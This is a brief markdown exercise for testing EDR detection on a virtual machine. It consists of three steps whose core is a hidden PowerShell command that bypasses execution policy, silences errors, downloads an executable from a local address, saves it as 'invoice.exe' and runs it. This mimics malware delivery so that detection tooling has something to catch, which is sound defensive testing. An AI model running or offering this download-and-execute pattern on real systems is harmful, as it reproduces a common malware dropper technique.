# Testing the EDR Detecion

## Following excersise needs to be run on your Virtual Mahcine, NOT your production machine!


1. Open Command Prompt as administrator
2. Run the following command "powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'"
3. Command Promt will close automatically


